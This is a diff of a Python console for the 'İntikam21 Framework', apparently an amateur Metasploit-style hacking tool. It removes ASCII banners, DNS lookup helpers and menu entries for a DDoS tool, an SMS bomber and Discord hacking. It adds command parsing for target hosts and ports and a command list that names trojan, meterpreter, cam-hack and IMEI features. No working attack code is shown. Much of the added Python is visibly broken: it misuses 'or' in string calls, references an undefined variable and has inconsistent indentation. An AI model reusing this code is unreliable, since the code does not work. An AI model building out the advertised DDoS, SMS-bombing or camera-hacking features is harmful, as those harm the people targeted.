-⠀⠘⣿⣿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡾⣏⠻⣦⣤⣿⠀⠀⢧⡇⠀⠀⠀⢹⣾⠀ ⠀⠀⠀⢠⡏⣠⣼⣋⣉⣀⣴⣁⣀⣀⡎
-⠀⠀⠈⢿⣿⣿⣿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣷⡌⠙⠺⢭⡿⠀⠀⠸⠆⠀⠀⠀⢸⣿⡀ ⠀⠀⠀⡟⢀⡧⣄⣠⣠⣤⣤⣤⣀⣈⡇
-⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠿⠃⠀⠈⠢⠐⢤⣧⠀⠀⠀⠀⠀⠀⠀⢸⡿⠀ ⠀⠀⣼⠁⡼⠉⠛⠒⠒⠒⠒⠶⠶⢿⠁
-⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⢀⣤⣛⡛⠛⢢⠀⠀⢠⠈⢪⣻⡇⠀⠀⠀⠀⠀⠀⠐⠃⠀ ⠀⢰⠏⢸⡧⠤⠤⠤⢤⣀⣀⡀⠀⡾⠀
-⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⣀⣀⠤⠴⠒⠚⣩⠽⣿⠖⠋⠉⠀⠀⣦⠈⣧⠀⠈⣳⣼⡿⠛⠀⠀⠀⠀⠀⠀⠀⢀⡤ ⠴⠞⠀⣿⠓⠢⠤⠤⠤⠤⣌⣉⣻⡇⠀
-⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣭⣭⣶⣦⣤⣶⠋⢡⣴⠇⢀⣴⡦⠀⣠⢿⣤⣿⡴⠒⢹⣏⣀⠀⠀⢀⣀⣀⠀⠀⢀ ⣠⣄ ⢀⣤⣾⡯⡀⠀⠉⠒⠒⠤⢤⣭⣽⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⢠⣻⠃⡴⠛⢁⣴⡯⠇⠀⠀⠈⠉⠉⠉⢹⡍⠉⠉⠙⣷⠈⢻⠉ ⠻⠀⠘ ⣟⠻⠀⡉⠁⠀⠀⠀⠀⠀⠀⣠⣿⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣮⣵⢰⣧⣞⣶⡿⢋⣡⠔⠚⣀⡀⠀⠀⠀⠀⢨⠇⠀⠀⠀⢹⠀⠈⠁⠀⠀⠀ ⠿⠀⠀⠈⠓⠶⠄⠀⠐⣲⡾⠋⡿⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣾⡿⢿⣿⢎⢠⠟⡠⣾⠟⢋⡠⠤⠤⢤⠤⠾⠤⠤⣤⢤⡼⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⣀⡴⠞⠁⢀⣴⠇⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣿⣿⣿⣿⡙⠻⣿⣿⣿⣿⣝⡋⣮⣴⣞⣥⡄⠀⠀⢀⣀⡤⠴⠚⠛⠪⣟⡧⢤⣄⣠⣄⡐ ⠦⣤⣤⣤⠴⠚⠉⠀⠀⠀⣾⠁⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⡄⠈⠙⢿⣿⣿⣿⣿⠟⠋⣁⣤⠴⠚⠉⠁⠀⠀⠀⠀⠀⠀⠉⠲⢤⡀⠉⠉ ⠉⠉⠁⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⡄⠀⠀⢙⣹⣷⠶⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠦ ⣄⠀⠀⠀⠀⠀⠀⠀⠰⢚⡇⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⡾⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠙⠂⠀⠀⠀⠀⠀⠈⠛⠃⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{Fore.RESET}⠀⠀⠀⠀""",
-    """
-    {Fore.RED}
-    ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠤⠤⠀⣀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀
-⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀⣀⣀⡠⠤⠔⠒⠂⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠁⠀⠒⠒⠠ ⠤⠤⣀⣀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⠤⠒⠒⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⢠⠒⠒⠤⠄⠲⠵⢦⡀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣄⢒⣉⢀⣀⡀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⡀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠈⢆⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠾⠁⠙⠒⢤⣄⡀⠠⣀⠀⠀⠒⠂⠤⢄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠒⠒⠠⠤⢀⣀⡀⠀⠈⠉⠉⠐⠒⠤ ⢄⣀⠀⠀⠀⠈⠣⡀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠫⡢⣀⠉⠒⢄⡀⠀⠀⠀⠉⠑⠂⠤⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠒⠢⠤⣀⡀⠀ ⠀⠀⠉⠒⠢⢄⡀⠈⢦⡀⠀⠀⠀
-⠀⠀⠀⠀⠀⢀⡴⢵⠶⢊⡍⢉⠉⠉⠉⠉⠉⠈⠪⡑⠦⡀⠈⠑⠄⠀⠀⠀⠀⠀⠀⠈⠉⠒⠠⢄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑ ⠒⠤⢀⡀⠀⡠⠌⠉⠒⠬⣦⣀⠀
-⠀⠀⠀⠀⠀⠈⢁⠴⢟⠿⣲⢿⣅⢒⠠⢄⡀⠀⠀⠈⠢⡈⠑⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠒⠠⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⢨⠏⠛⠧⣄⠀⠀⠀⠀⠉
-⠀⠀⠀⠀⠀⣠⠋⢀⠈⠀⠉⠀⠹⡎⠳⡀⠘⠠⠀⠀⠀⢹⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠦⣀⡀⠀⠀⠀⠀ ⠀⠀⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⡼⢛⠞⠫⣀⢀⡀⠀⠀⣿⠀⠘⣦⠀⠀⡀⠀⠀⡇⠀⠀⡴⠀⡠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠣⠄⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠰⠿⢃⣀⣤⡞⢁⣼⠷⠀⠀⡇⠀⠀⡇⠀⢰⠃⠀⢠⠁⠀⡰⠁⡰⠁⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⠤⠔⠒⠒⠂⠀⠀⠀⠀⠉⠉⠉ ⠲⢦⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠈⠳⣾⡿⣫⠞⡝⠀⢠⠄⢸⠃⠀⠀⡻⠀⠊⠀⢀⠎⠀⡰⠁⢰⠃⠀⠀⠀⠀⢀⡠⠔⠊⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠉⠻⠦⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠑⠴⠁⡸⠁⠀⡜⢀⡟⠀⠀⠀⡇⠀⠀⡠⡋⠀⠰⢁⡠⡮⠀⠀⠀⣠⠔⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⢠⠃⠀⢰⠁⣼⠁⠀⠀⢰⠁⢀⡮⣊⠤⠒⠛⠓⠲⠀⠀⠀⠛⠻⢧⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢤⣄⣀⡀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⢀⠎⠀⠀⡇⠀⡧⠀⠀⠀⡧⣶⠕⠫⠴⠒⠦⠀⠀⠒⠀⠀⠀⡠⠄⠀⠠⢭⡲⢤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢝⠢⣄ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⣸⠀⠀⠀⠀⠀⠱⣦⣤⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡜⠁⠀⠀⠀⠀⠱⡀⠙⠚⢧⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⡈ ⠣⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⢱⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠑⢧⣀⠀⠀⠀⠀⠀⠀⠀⠀⢱ ⠀⢱⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠈⣆⠀⠀⠈⢆⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⢣⠀⠀⠀⠀⠀⢀⠣⣀⠀⠀⠀⠀⠙⢧⡀⠀⠀⠀⠀⠀⠀⠀⠀ ⡇⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠈⢦⡀⠀⠀⠉⠢⢄⠀⠀⠀⠀⢸⠀⠀⠀⢠⠖⠉⡌⠁⠘⡏⡽⠚⠥⣲⡸⠀⠀⠉⠢⠀⠀⠀⠀⠈⠫⢄⣀⡀⠀⠀⡰ ⠁⠀⢱⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠙⠦⡀⠀⠀⠀⠉⢇⠀⠀⢰⠁⣀⠴⡏⠀⠀⠈⠢⡀⠘⢧⡀⠀⠈⠈⢳⡦⣀⠀⠀⠀⢄⡀⠀⠀⠀⠉⠁⠘⠊⠁ ⠀⣠⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠢⠤⢠⡬⠖⠁⣸⡋⢣⡄⠈⠓⠤⣀⣤⠒⡄⠀⠉⠒⠤⣀⣀⠑⢄⠉⠲⢄⡀⠈⠓⠤⠀⠀⠀⠀⠄ ⣴⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠔⠋⠀⢤⡦⠚⢡⠎⠀⢀⡠⠔⠁⢀⡠⠃⠀⠀⠀⢀⠆⠀⢠⠃⠀⠀⠀⠈⠓⠦⠤⢀⣀⣀⡀⠤⠚ ⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⢠⣤⡶⣶⠋⠁⡠⣶⢶⣝⠏⢀⠔⣡⢶⢲⠟⢖⣠⠒⠁⠀⠀⢀⣀⣤⣊⠀⢀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠉⠛⠹⠊⠉⠉⠘⠉⠻⠒⠒⠁⠀⠓⠓⠛⠃⠀⠁⠀⠀⠀⠀⠛⠗⠓⠿⠖⠋⠁
-
-___ _   _ _____ ___ _  __    _    __  __ ____ 
-|_ _| \ | |_   _|_ _| |/ /   / \  |  \/  |___ \/ ( ) 
- | ||  \| | | |  | || ' /   / _ \ | |\/| | __) | |/\___ \
- | || |\  | | |  | || . \  / ___ \| |  | |/ __/| |  ___) |
-|___|_| \_| |_| |___|_|\_\/_/   \_\_|  |_|_____|
-⠀⠀⠀{Fore.RESET}⠀""",
-   """
-   {Fore.BLUE}
-                                                ___
-    |\    ___   |\/|   /\      |            /___)   /\     ^      ___   |   |
-    | >  /___   |  |  <  >  |\ |           /  \    <  >   /_\    /      |___|
-    |/  /_____  |  |   \/   | \|         //    \\   \/   /   \  (_____  |   |
-                |                                \                      |    
-
-                   İ   N   T   İ   K   A   M   2   1 
-
-
-                                      cDc
-                                     _   _
-                                    ((___))
-                                    [ x x ]
-                          cDc        \   /        cDc
-                                     (' ')
-                                      (U)
-
-
-
-
-                               İ N T İ K A M 2 1
-                          -int-   BASE SYSTEM   -int-
-                          ---------------------------
-
-                                HAVE A NICE DAY
------------------------ ------------ --------- -------- ------ ---- -- - - - 
-    {Fore.RESET}""",
-    """
-    {Fore.BLUE}
-       +-------------------------------------------------+
-        |               _                                 |
-        |              /  \                               |
-        |             /|oo \        İ N T İ K A M 2 1|
-        |            (_|  /_)                             |
-        |             _`@/_ \    _    F R A M E W O R K |
-        |            |     | \   \\                       |
-        |            | (*) |  \   ))    Boston, MA, USA   |
-        |   ______   |__U__| /  \//                       |
-        |  / SUDO \   _//|| _\   /   İntoNet 1:666/1777   |
-        | (________) (_/(_|(____/                         |
-        |                  (rm)                           |
-        +-------------------------------------------------+
-   {Fore.RESET} """, 
-    """{Fore.RED}
-                                                                                                        
-   @@                               @@@#+::-=+#@    +=@@@@           :**-                               
-                                        @@@@@@        @@         =@-  +  @%@%                           
-   @@.   @@@      @@  @@@@@@@@@@@%  @@  @@@@@@       #@         % :=@%%%%@*= **                         
-   @@.   @@@@     @@      -@@       @@  @@@@@@      *@        :..@# -@@@@* =% *#                        
-   @@.   @@ %@.   @@      -@@       @@  @@@@@@     %@         - -%  %+ *%@+ =%.+:                       
-   i@@.   @@  =@*  @@      -@@       @@  @@@@@@    @@          =:%= @@@*###@  %#@#                       
-   @@.   @@   =@@ @@      -@@       @@  @@@@@@   @@           ####  @@@@@@- +###                        
-   @@.   @@    +@@@@      -@@       @@  @@@@@@  @@@@#          - =#%@@@@@@@%# =+                        
-   @@    @@      @@@      :@@       @@ @@@@@@@@@+   #@@@        #  .=+**+-   #:                         
-                                        %@@@@@@      @@@@         =+     :-*                            
-                                        #@@@@@       @@@@-                                              
-                                        *@@@@@       @@@@@    @@@      -@@@     -@@@   @@@%@@@    #@@@  
-                                        +@@@@@       @@@@@   @# %@     -@@@@    @ @@        %@+     #@  
-                                        -@@@@@       @@@@@  @@   @@    -@- @.  #@ @@       -@@      #@  
-                                        @@@@@@@      @@@@@ *@@   @@=   -@: +@  @  @@     *@@        #@  
-                                                     #@@@@@@@.    @@   -@:  @@@:  @@   +@#          #@  
-                                                      @@@@@@       @@  -@:  :@@   @@  +@@@@@@@-  :*#@@@ 
-                                                        @@@@                                            
-                                                                                                                                                                                         {Fore.RESET}        """, 
-        """ {Fore.RED}
-                            ..,;:ccc,.                             
-                          ......''';lxO.                           
-                ...............,:ld;                           
-                           .';;;:::;,,.x,                          
-                      ..'''.            0Xxoc:,.  ...               
-                  ....                ,ONkc;,;cokOdc',.            
-                 .                   OMo           ':ddo.          
-                                    dMc               :OO;          
-                                    0M.                 .:o.       
-                                    ;Wd                            
-                                     ;XO,                         \033[93mCreated By @intikam21 \033[34m                         
-                                       ,d0Odlc;,..                 
-                                           ..',;:cdOOd::,.        
-                                                    .:d;.':;.     
-                                                       'd,  .'     
-                                                         ;l   ..    
-                                                          .o       
-                                                            c
-                                                            .'                      
-                 ▐ ▄                ▄▄▄▄▄        
-   ██         •█▌▐█            •██          
-   ▐█·        ▐█▐▐▌           ▐█.▪        
-   ▐█▌        ██▐█▌         ▐█▌·        
-   ▀▀▀        ▀▀ █▪            ▀▀▀  {Fore.RESET}""",
-   """
-                             ########                  #
-                      #################            #
-                   ######################         #
-                  #########################      #
-                ############################
-               ##############################
-               ###############################
-              ###############################
-              ##############################
-                              #    ########   #
-                 {Fore.RED}###{Fore.RESET}      {Fore.RED}###{Fore.RESET}       ####   ##
-                                      ###   ###
-                                    ####   ###
-               ####          ##########   ####
-               #######################   ####
-                 ####################   ####
-                  ##################  ####
-                    ############      ##
-                       ########        ###
-                      #########        #####
-                    ############      ######
-                   ########      #########
-                     #####       ########
-                       ###       #########
-                      ######    ############
-                     #######################
-                     #   #   ###  #   #   ##
-                     ########################
-                      ##     ##   ##     ##
-                            https://intikam21.com
-   """,
-   """
-+-------------------------------------------------------+
-|  {Fore.RED}İNTİKAM21 by Replit {Fore.RESET}                                 |
-+---------------------------+---------------------------+
-|     {Fore.BLUE} __________________ {Fore.RESET}  |                           |
-| {Fore.BLUE} ==c(______(o(______(_()  | |""""""""""""|======[***  |{Fore.RESET}
-|   {Fore.BLUE}          )=\\  {Fore.RESET}  {Fore.GREEN}       | |  EXPLOIT   \\            |
-|  {Fore.RESET}{Fore.BLUE}         // \\\\  {Fore.RESET} {Fore.GREEN}       | |_____________\\_______    |
-|   {Fore.RESET} {Fore.BLUE}       //   \\\\ {Fore.RESET} {Fore.GREEN}       | |=={Fore.RESET}[int >]{Fore.GREEN}============\\   |{Fore.RESET}
-|  {Fore.BLUE}        //     \\\\        | |______________________\\  |
-|    {Fore.RESET}  {Fore.BLUE}   // {Fore.RESET}RECON{Fore.BLUE} \\\\       | \\(@)(@)(@)(@)(@)(@)(@)/   |
-|        {Fore.BLUE}//         \\\\      |  *********************    |
-+---------------------------+---------------------------+
-|      o O o                |        \\'\\/\\/\\/\\/'/         |
-|              o O          |         )======(          |
-|                 o         |   {Fore.RESET}  {Fore.YELLOW}  .' {Fore.RESET} LOOT  '.   {Fore.YELLOW}     |
-|{Fore.RED} |^^^^^^^^^^^^^^{Fore.RESET} {Fore.GREEN}|l___      |      /    _||__   {Fore.RESET}\\       |
-{Fore.RED}| |    PAYLOAD     |""\\___,{Fore.GREEN} |     /    (_||_     \\      |{Fore.RESET}
-{Fore.RED}| |________________|__|{Fore.RESET}){Fore.YELLOW}__| |    |     __||_)  {Fore.RESET}   |     |
-{Fore.RED}| |(@)(@)''""**|(@)(@)**|(@){Fore.YELLOW} |    "       ||       "     |{Fore.RESET}
-{Fore.RED}|  = = = = = = = = = = = =  {Fore.RESET}| {Fore.YELLOW}    '--------------'      | {Fore.RESET}
-+---------------------------+---------------------------+
-
-   """,
-   """
-   {Fore.RED}
-   ____      __  _ __                  ___  ___
-   /  _/___  / /_(_) /______ _____ ___ |__ \<  /
-   / // __ \/ __/ / //_/ __ `/ __ `__ \__/ // /
- _/ // / / / /_/ / ,< / /_/ / / / / / / __// /
-/___/_/ /_/\__/_/_/|_|\__,_/_/ /_/ /_/____/_/
-
-   ______      __                   ______
-  / ____/_  __/ /_  ___  _____     /_  __/__  ____ _____ ___
- / /   / / / / __ \/ _ \/ ___/      / / / _ \/ __ `/ __ `__ \
-/ /___/ /_/ / /_/ /  __/ /         / / /  __/ /_/ / / / / / /
-\____/\__, /_.___/\___/_/         /_/  \___/\__,_/_/ /_/ /_/
-     /____/
-{Fore.RESET}
-    +-------------------------------------------------------------+
-     | [+] the {Fore.YELLOW}system{Fore.RESET} was infiltrated                             |
-     | [~] Coder: intikam21                                       |
-     | [~] Team: {Fore.RED}İntikam21{Fore.RESET} Cyber Team                              |
-     | [~] Designer: İntikam21 Design Team                         |
-     | [~] Supporters: Not			                        |
-   +--------------------------------------------------------------+
-    """   
-    # Daha fazla banner eklenebilir
-    ]
-    # Rastgele bir banner seçimi yapılıyor
-	chosen_banner = random.choice(banners)
-	# Print the formatted text
-	print(chosen_banner.format(Fore=Fore))
-def menu_banner():
-	print("" + Fore.RESET)
-	print(f"""
-=[ {Fore.YELLOW}İntikam21-Framework console v4.0.15-dev-bbf096e{Style.RESET_ALL}                  ]
-+ -- --=[ 2456 exploits - 1248 auxiliary - 500 post]
-+ -- --=[ 1465 payloads - 50 encoders - 1 nops     ]
-+ -- --=[ 40 evasion -                             ]
-+ -- --=[ Osint Framework - 2 shodan - 90 network  ]
-İntikam21 Documentation: https://sites.google.com/view/intilam21-cyber-team/kay%C4%B1t
-""" + Fore.RESET)
+	banner()
+	banners += bannerss
+	
+	
 def inputrs(sk):
 	if sk.lower("y" or "yes"):
 		pass
@@ -639,84 +304,6 @@ def parse_input(input_str):
     else:
         raise ValueError("Geçersiz giriş formatı. IP adresi/domain ve opsiyonel olarak port giriniz.")
 
-def dns_lookup_a(domain, port=None):
-    try:
-        ip_address = socket.gethostbyname(domain)
-        if port:
-            ip_address = f"{ip_address}:{port}"
-        print(f"{domain}:{port} için A kaydı: {ip_address}")
-    except socket.gaierror as e:
-        print(f"{domain}:{port} için A kaydı bulunamadı: {e}")
-
-def dns_lookup_mx(domain, port=None):
-    try:
-        answers = socket.getaddrinfo(domain, port, socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
-        mx_records = [answer for answer in answers if answer[1] == socket.SOCK_STREAM]
-        if mx_records:
-            for mx_record in mx_records:
-                print(f"{domain}:{port} için MX kaydı: {mx_record}")
-        else:
-            print(f"{domain}:{port} için MX kaydı bulunamadı.")
-    except socket.gaierror as e:
-        print(f"{domain}:{port} için MX kaydı sorgulaması başarısız oldu: {e}")
-
-def dns_lookup_ns(domain, port=None):
-    try:
-        answers = socket.getaddrinfo(domain, port, socket.AF_INET, socket.SOCK_STREAM)
-        ns_records = [answer for answer in answers if answer[1] == socket.SOCK_STREAM]
-        if ns_records:
-            for ns_record in ns_records:
-                print(f"{domain}:{port} için NS kaydı: {ns_record}")
-        else:
-            print(f"{domain}:{port} için NS kaydı bulunamadı.")
-    except socket.gaierror as e:
-        print(f"{domain}:{port} için NS kaydı sorgulaması başarısız oldu: {e}")
-
-def dns_lookup_txt(domain, port=None):
-    try:
-        answers = socket.getaddrinfo(domain, port, socket.AF_INET, socket.SOCK_STREAM)
-        txt_records = [answer for answer in answers if answer[1] == socket.SOCK_STREAM]
-        if txt_records:
-            for txt_record in txt_records:
-                print(f"{domain}:{port} için TXT kaydı: {txt_record}")
-        else:
-            print(f"{domain}:{port} için TXT kaydı bulunamadı.")
-    except socket.gaierror as e:
-        print(f"{domain}:{port} için TXT kaydı sorgulaması başarısız oldu: {e}")
-
-def reverse_dns_lookup(ip, port=None):
-    try:
-        hostnames = socket.gethostbyaddr(ip)
-        if port:
-            ip = f"{ip}:{port}"
-        print(f"{ip} için ters DNS çözümlemesi: {hostnames}")
-    except socket.herror as e:
-        print(f"{ip} için ters DNS çözümlemesi başarısız oldu: {e}")
-
-def ip_check(ip_address):
-    ip = IPAddress(ip_address)
-    if ip in IPNetwork('192.168.1.0/24'):
-        print(f"{ip_address} yerel ağda bulunuyor.")
-    else:
-        print(f"{ip_address} yerel ağda bulunmuyor.")
-
-def main():
-    input_str = input("Bir IP adresi veya domain adı (opsiyonel olarak port ile birlikte) girin: ")
-    domain, port = parse_input(input_str)
-    
-    try:
-        socket.inet_aton(domain)
-        is_ip = True
-    except socket.error:
-        is_ip = False
-    
-    if is_ip:
-        reverse_dns_lookup(domain, port)
-    else:
-        dns_lookup_a(domain, port)
-        dns_lookup_mx(domain, port)
-        dns_lookup_ns(domain, port)
-        dns_lookup_txt(domain, port)
 def search(modules, query):
     results = {}
     query = query.lower()  # Convert query to lowercase for case-insensitive search
@@ -743,9 +330,6 @@ modules = {
     "back": "back to term",
     "jobs": "see a jobs",
     "connect": "listen ip",
-    "1": "DDOS TOOL",
-    "2": "SMS BOMBER",
-    "3": "Discord hacking tool",
     "intweb": "Web hacking Tool",
     "intcam": "Cam Hack For intikam21 users",
     "intmeterpreter": "payload using and creating"
@@ -828,12 +412,18 @@ def get_input(modules=None, modulename=None, cdn=None):
 get_input()
 banner()
 menu_banner()
+global help_input
+global valid_commands
+valid_commands = {
+"neofetch", "com-help", "intshark", "oip", "introjan", "intai", "track", "build", "mode-admin", "use", "set", "show", "build", "mode-", "back", "item", "search", "show commands", "int install", "connect", "int", "install", "mode-ninja", "int install mode-ninja", "int install git", "int install aichat", "use", "exploit", "bset", "banner", "py-search", "payload-search", "exp-search", "exploit-search", "jobs", "jobs -k", "dns", "help", "use ", "intcrawler", "searchuser", "mailsearch", "phonesearch", "connectbot", "meterpreter", "shotgun", "imei", "exp-search", "py-search", "run", "show"
+    }
+    
 while True:
     help_input = input(prompt)
     print(Fore.RESET)
     if help_input.lower() == "help":
     	print("""
-		|•COMMAND|        |•Function|
+		|COMMAND|         |Function|
 		---------------------		 -----------------
 		mode-{mode-name}	-switches to that mode
 		use						-use commands
@@ -924,7 +514,7 @@ OİP COMMANDS
 SHOW USAGE		
 ===============
 				
-	- show {exploits} or {tools} or {commands}
+	- show (your want to info module)
 
 	
 		
@@ -945,36 +535,33 @@ HELLO, WE ARE THE İNTİKAM21 CYBER TEAM, THE REASON WE MADE THIS TOOL IS TO EDU
 			[intcam]Cam Hack for intikam21 users
 			
 			we are working...		
-For Examples:
-		use command using auxiliary:
-			use auxiliary
-		selecting dirs example(if use auxiliary) else (use exploits or payloads or other tools):
-			select {Your selecting module)
-		RUN
-		=======
-		For Example:
-			run shodan
-			if you are set domain or others and use shodan following commands:
-				use shodan
-				set API={YourApiKey}
-				or set API {YourApiKey}
-				set mail=yourinfo@example.com
-				or
-				set DOMAİN=google.com
-				else
-				you are must using arguments or back else set other arguments for shodan
-			finally:
-				run
-Examples:
-    others enter a documents,
-    # Entering Modules:
-    	usage:
-    		use modules (Your Path)
-    	# example:
-    		set other=127.0.0.1
-    		use modules /intframework/modules/intcrawler/
-    		run
-		""")
+		""")	
+    if help_input.lower().startswith(("set rhosts", "set rhosts=")):
+    	if help_input.lower().startswith("set rhosts="):
+    	   rhost = help_input[11:]  # "set rhosts=" 11 karakter uzunluğunda, 10'dan itibaren dilimlemek gerekiyor
+    	else:
+    	   rhost = help_input[10:]
+    	global RHOSTS
+    	RHOSTS = rhost
+    	print("intbase: RHOSTS ==> " + RHOSTS)
+
+    if help_input.lower().startswith(("set rport", "set rport=")):
+        if help_input.lower().startswith("set rport="):
+        	rprt = help_input[10:]  # "set rport=" 10 karakter uzunluğunda, 9'dan itibaren dilimlemek gerekiyor
+        else:
+        	rprt = help_input[10:]
+        global RPORT
+        RPORT = rprt
+        print("intbase: RPORTS ==> " + RPORT)
+    if help_input.startswith("py-search" or "payload-search") and help_input.endswith("''"):
+    	    if help_input.startswith("payload-search '") and help_input.endswith("'"):
+    	    	term = user_input[len("payload-search '"):-1]
+    	    	result = search_payloads(term)
+    	    	print_payloads(result)
+    	    else:
+    	    	term = user_input[len("py-search '"):-1]
+    	    	result = search_payloads(term)
+    	    	print_payloads(result) 
